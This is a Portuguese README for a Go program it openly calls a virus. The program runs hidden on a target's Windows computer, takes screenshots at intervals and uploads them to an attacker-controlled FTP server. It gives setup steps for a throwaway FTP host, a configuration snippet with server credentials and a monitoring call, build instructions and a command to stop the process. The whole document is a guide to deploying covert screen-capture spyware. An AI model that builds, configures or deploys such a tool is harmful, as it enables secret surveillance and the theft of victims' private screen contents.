# Vírus FTP CLIENT

Uma aplicação que roda em segundo plano para capturar telas e enviá-las a um servidor FTP remoto.

## Visão Geral

Esta ferramenta foi projetada para ser executada no computador do cliente (alvo). Uma vez iniciada, ela:

- Roda silenciosamente em segundo plano sem janela visível
- Captura telas em intervalos configuráveis
- Envia as capturas para um servidor FTP que você controla
- Reconecta automaticamente se a conexão FTP for perdida

## Configuração

### Configuração do Servidor FTP

1. Crie um servidor FTP temporário gratuito em [SFTPCloud](https://sftpcloud.io/tools/free-ftp-server)
   - Isso fornece um servidor FTP gratuito por 1 hora com 1GB de armazenamento
   - Anote o endereço do servidor, nome de usuário e senha fornecidos
   
2. Ou use qualquer outro servidor FTP de sua escolha

### Configuração do Cliente

1. Abra `cmd/client/main.go` e configure.

```go
config := pkg.Config{
    ServerAddress: "seu-servidor-ftp.com", // Substitua pelo endereço do seu servidor FTP
    Username:      "seu-usuario",          // Substitua pelo seu nome de usuário FTP
    Password:      "sua-senha",            // Substitua pela sua senha FTP
    Interval:      5,                      // Captura a cada 5 segundos
}
pkg.StartMonitoringWithConfig(config)
```

### Compilando a aplicação

Execute o script `build.bat` para compilar a aplicação:

```
build.bat
```

Isso criará o arquivo `screenshot-client.exe` na pasta bin/

### Parando a aplicação

```cmd
taskkill /F /IM screenshot-client.exe
```